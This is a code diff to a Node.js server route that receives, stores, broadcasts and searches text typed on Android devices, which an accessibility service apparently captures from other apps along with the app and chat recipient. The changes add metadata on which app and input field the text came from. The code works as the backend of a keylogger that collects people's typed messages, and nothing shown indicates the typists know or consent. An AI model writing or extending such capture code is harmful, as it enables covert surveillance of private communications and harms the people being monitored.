@@ -9,6 +9,7 @@ const IGNORED_TYPED_TEXT = new Set([
     'type a message',
     'write a message',
     'send a message',
+    'send chat',
     'ask google',
 ])
 const TARGET_INHERIT_MINUTES = 90
@@ -19,7 +20,12 @@ function normalizeTypedText(value) {
 
 // POST /api/typed-text — called by the Android accessibility service
 router.post('/', async (req, res) => {
-    const { deviceId, packageName, appLabel, targetName, text, capturedAt, appRole } = req.body
+    const {
+        deviceId, packageName, appLabel, targetName, text, capturedAt, appRole,
+        rawPackage, rawAppLabel, resolvedPackage, resolvedAppLabel,
+        attributionSource, attributionConfidence, targetSource,
+        className, viewId, hintText, contentDescription, inputType, eventType,
+    } = req.body
 
     if (!deviceId || !packageName || !text || !capturedAt) {
         return res.status(400).json({ error: 'Missing required fields: deviceId, packageName, text, capturedAt' })
@@ -33,6 +39,7 @@ router.post('/', async (req, res) => {
 
     try {
         let effectiveTarget = targetName ?? ''
+        let effectiveTargetSource = targetSource ?? (String(effectiveTarget).trim() ? 'client' : null)
         if (!String(effectiveTarget).trim()) {
             const captured = new Date(capturedAt)
             if (!Number.isNaN(captured.getTime())) {
@@ -48,14 +55,50 @@ router.post('/', async (req, res) => {
                     [deviceId, packageName, captured.toISOString(), TARGET_INHERIT_MINUTES]
                 )
                 effectiveTarget = inherited.rows[0]?.target_name ?? ''
+                if (effectiveTarget) effectiveTargetSource = 'server_inherited'
             }
         }
 
+        const cleanRawPackage = String(rawPackage ?? packageName).slice(0, 255)
+        const cleanRawAppLabel = String(rawAppLabel ?? appLabel ?? '').slice(0, 255)
+        const cleanResolvedPackage = resolvedPackage == null ? null : String(resolvedPackage).slice(0, 255) || null
+        const cleanResolvedAppLabel = resolvedAppLabel == null ? null : String(resolvedAppLabel).slice(0, 255) || null
+        const cleanAttributionSource = attributionSource == null ? null : String(attributionSource).slice(0, 64) || null
+        const cleanClassName = className == null ? null : String(className).slice(0, 500) || null
+        const cleanViewId = viewId == null ? null : String(viewId).slice(0, 500) || null
+        const cleanHintText = hintText == null ? null : String(hintText).slice(0, 1000) || null
+        const cleanContentDescription = contentDescription == null ? null : String(contentDescription).slice(0, 1000) || null
+
         const result = await db.query(
-            `INSERT INTO typed_text (device_id, package_name, app_label, target_name, text, captured_at)
-             VALUES ($1, $2, $3, $4, $5, $6)
-             RETURNING id, device_id, package_name, app_label, target_name, text, captured_at, received_at`,
-            [deviceId, packageName, appLabel ?? '', effectiveTarget, text, capturedAt]
+            `INSERT INTO typed_text (
+                device_id, package_name, app_label, target_name, raw_package, raw_app_label,
+                resolved_package, resolved_app_label, attribution_source, attribution_confidence,
+                target_source, class_name, view_id, hint_text, content_description,
+                input_type, event_type, text, captured_at
+             )
+             VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,$19)
+             RETURNING *`,
+            [
+                deviceId,
+                packageName,
+                appLabel ?? '',
+                effectiveTarget,
+                cleanRawPackage,
+                cleanRawAppLabel,
+                cleanResolvedPackage,
+                cleanResolvedAppLabel,
+                cleanAttributionSource,
+                Number(attributionConfidence) || 0,
+                effectiveTargetSource,
+                cleanClassName,
+                cleanViewId,
+                cleanHintText,
+                cleanContentDescription,
+                inputType == null ? null : Number(inputType),
+                eventType == null ? null : Number(eventType),
+                text,
+                capturedAt,
+            ]
         )
         const row = result.rows[0]
         broadcast('typedtext', row)
@@ -87,7 +130,7 @@ router.get('/', async (req, res) => {
     }
     if (search) {
         params.push(`%${search}%`)
-        conditions.push(`(text ILIKE $${params.length} OR target_name ILIKE $${params.length} OR app_label ILIKE $${params.length} OR package_name ILIKE $${params.length})`)
+        conditions.push(`(text ILIKE $${params.length} OR target_name ILIKE $${params.length} OR app_label ILIKE $${params.length} OR package_name ILIKE $${params.length} OR raw_app_label ILIKE $${params.length} OR resolved_app_label ILIKE $${params.length})`)
     }
 
     const where = conditions.length ? `WHERE ${conditions.join(' AND ')}` : ''
@@ -95,7 +138,10 @@ router.get('/', async (req, res) => {
     try {
         const [dataResult, countResult] = await Promise.all([
             db.query(
-                `SELECT id, device_id, package_name, app_label, target_name, text, captured_at, received_at
+                `SELECT id, device_id, package_name, app_label, target_name, raw_package, raw_app_label,
+                        resolved_package, resolved_app_label, attribution_source, attribution_confidence,
+                        target_source, class_name, view_id, hint_text, content_description,
+                        input_type, event_type, text, captured_at, received_at
                  FROM typed_text
                  ${where}
                  ORDER BY captured_at DESC, received_at DESC
